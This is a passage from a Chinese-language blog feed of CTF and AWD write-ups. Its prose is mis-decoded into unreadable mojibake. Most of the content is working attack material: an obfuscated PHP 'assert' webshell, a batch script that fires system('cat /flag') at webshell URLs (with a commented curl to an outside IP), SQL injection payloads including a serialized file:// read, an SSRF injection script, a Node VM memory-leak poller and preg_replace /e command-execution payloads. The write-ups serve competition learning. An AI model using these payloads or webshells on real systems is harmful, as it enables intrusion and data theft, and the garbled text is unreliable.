punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" = \"hitcon{"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"}\";"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            timeout<span class="token punctuation">:</span> <span class="token number">1000</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"eval ->"</span> <span class="token operator">+</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listening on port 3000!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>VMæ²™ç®±é€ƒé€¸</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://8f669547-6625-4707-a4f7-0ee3911f83e3.node4.buuoj.cn:81/?data=Buffer(500)'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag{'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>æ‹¿åˆ°linuxè·‘</p><p><img src="/2021/10/25/hitcon2016-leaking/1.png" alt="1"></p><p><a href="https://blog.csdn.net/cjdgg/article/details/119792059">https://blog.csdn.net/cjdgg/article/details/119792059</a></p><p><a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VMæ²™ç®±é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku S2 AWDæŽ’ä½èµ›-6</title>
      <link href="2021/10/25/bugku-s2-awd-pai-wei-sai-6/"/>
      <url>2021/10/25/bugku-s2-awd-pai-wei-sai-6/</url>
      
        <content type="html"><![CDATA[<p><strong>public/video/index.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$poc</span><span class="token operator">=</span><span class="token string">"a#s#s#e#r#t"</span><span class="token punctuation">;</span> <span class="token variable">$poc_1</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$poc_2</span><span class="token operator">=</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$poc_2</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//poc_1=array([0]=>a [1]=>s [2]=>s [3]=>e [4]=>r [5]=>t)</span><span class="token comment" spellcheck="true">//s=system('cat /flag'); </span><span class="token delimiter">?></span></code></pre><p>explodeå‡½æ•°çš„å¤§æ¦‚æ„æ€æ˜¯é‡åˆ°â€œ#â€å°±åœæ­¢å¹¶æŠŠå®ƒå‚¨å­˜å…¥æ•°ç»„</p><p>æ‰€ä»¥</p><pre><code>poc_1=array([0]=&gt;a [1]=&gt;s [2]=&gt;s [3]=&gt;e [4]=&gt;r [5]=&gt;t)poc_2=asserts=system('cat /flag'); </code></pre><p>æ‰¹é‡æ”»å‡»è„šæœ¬ï¼š</p><pre class=" language-Python"><code class="language-Python">import requestssession=requests.session()#webshellurl=["http://xxx/.index.php"]webshellurl=["http://xxx/public/video/index.php?s=system('cat /flag');",]data = {    "s":"system('cat /flag');"    #"b":"sec",    #"cmd":"system('curl 10.120.115.10/index.php?token=108_USR-20211016-eelbz');"    #"pass":"ghostinthewire1998",    #"v":"system('ls /');"}for url in webshellurl:    try:        r=session.post(url=url,data=data,proxies={"http":None,"https":None},timeout=1)        print(r.text)    except:        pass</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯2018ï¼šfakebook</title>
      <link href="2021/10/24/wang-ding-bei-2018-fakebook/"/>
      <url>2021/10/24/wang-ding-bei-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<p>/robots.txt</p><p>/user.php.bak</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>å­˜åœ¨sqlæ³¨å…¥ï¼š</p><pre><code>view.php?no=1 and updatexml(1,concat('~',(select/**/database()),'~'),1)%23</code></pre><p><img src="/2021/10/24/wang-ding-bei-2018-fakebook/image-20211024022151355.png" alt="image-20211024022151355"></p><pre><code>view.php?no=1%20and%20updatexml(1,concat(%27~%27,substr((select%20passwd%20from%20users),110,32),%27~%27),1)%23</code></pre><pre><code>view.php?no=2%20union/**/select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27</code></pre><p>flag{c1e552fdf77049fabf65168f22f7aeab}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.0.18/24ååºåˆ—åŒ–æ¼æ´ž</title>
      <link href="2021/10/24/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/"/>
      <url>2021/10/24/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTFï¼šWeb-ics</title>
      <link href="2021/10/21/xctf-web-ics/"/>
      <url>2021/10/21/xctf-web-ics/</url>
      
        <content type="html"><![CDATA[<h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/2021/10/21/xctf-web-ics/1.png" alt="1"></p><p><img src="/2021/10/21/xctf-web-ics/2.png" alt="2"></p><p><img src="/2021/10/21/xctf-web-ics/3.png" alt="3"></p><p><strong>sqlæ³¨å…¥ï¼š</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> urlliburl <span class="token operator">=</span> <span class="token string">'http://111.198.29.45:52536/download.php'</span><span class="token comment" spellcheck="true"># subquery = "database()"</span><span class="token comment" spellcheck="true"># ssrfw</span><span class="token comment" spellcheck="true"># subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"</span><span class="token comment" spellcheck="true"># cetcYssrf</span><span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"</span><span class="token comment" spellcheck="true"># secretname -> flag</span><span class="token comment" spellcheck="true"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"</span><span class="token comment" spellcheck="true"># value -> flag{cpg9ssnu_OOOOe333eetc_2018}</span>subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>id <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>        urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>            <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span> <span class="token string">"L','1',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'1'/*"</span><span class="token punctuation">,</span>            <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span>            <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>            <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span> <span class="token string">"Esq."</span><span class="token punctuation">,</span>            <span class="token string">"txtdob"</span><span class="token punctuation">:</span> <span class="token string">"*/,'01/10/2019"</span><span class="token punctuation">,</span>            <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span> id<span class="token punctuation">,</span>            <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span> id            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> d<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>dirsearchæ‰«æå‡ºindex.php/login</p><p>è¿›å…¥æœ‰ä¸ª?page</p><pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre><p><strong>index.php:</strong></p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>preg_replace($pattern, $replacement, $subject)</strong></p><ul><li>ä½œç”¨ï¼šæœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementçš„å†…å®¹è¿›è¡Œæ›¿æ¢ã€‚</li><li>$pattern:       è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$replacement:   ç”¨äºŽæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$subject:       è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li></ul><p>subjectä¸­æœ‰è¦æœç´¢çš„patternçš„å†…å®¹ï¼ŒåŒæ—¶å°†åœ¨replacementå‰åŠ ä¸Š/eï¼Œè§¦å‘/eæ¼æ´žï¼Œå°±å¯ä»¥æ‰§è¡Œreplacementä¸­çš„æ­£ç¡®çš„phpä»£ç </p><pre><code>?pat=/1/e&amp;rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&amp;sub=1</code></pre><p><img src="/2021/10/21/xctf-web-ics/4.png" alt="4"></p><pre><code>?pat=/1/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1</code></pre><p><img src="/2021/10/21/xctf-web-ics/5.png" alt="5"></p><h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>æ‰«æåŽå°</p><p>idçˆ†ç ´</p><p>å­—å…¸ç”Ÿæˆï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> m <span class="token keyword">in</span>  range <span class="token punctuation">(</span><span class="token number">100001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>view-source</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: ?page=flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      page <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      id <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.phps<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>view<span class="token operator">-</span>source<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"backup/"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+\.ph(p[3457]?|t|tml)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Bad file extension"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token delimiter">?></span>    <span class="token delimiter">&lt;?php</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from cetc007.user where id='$id'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> False<span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br >something wae wrong ! &lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"id: "</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"name:"</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token 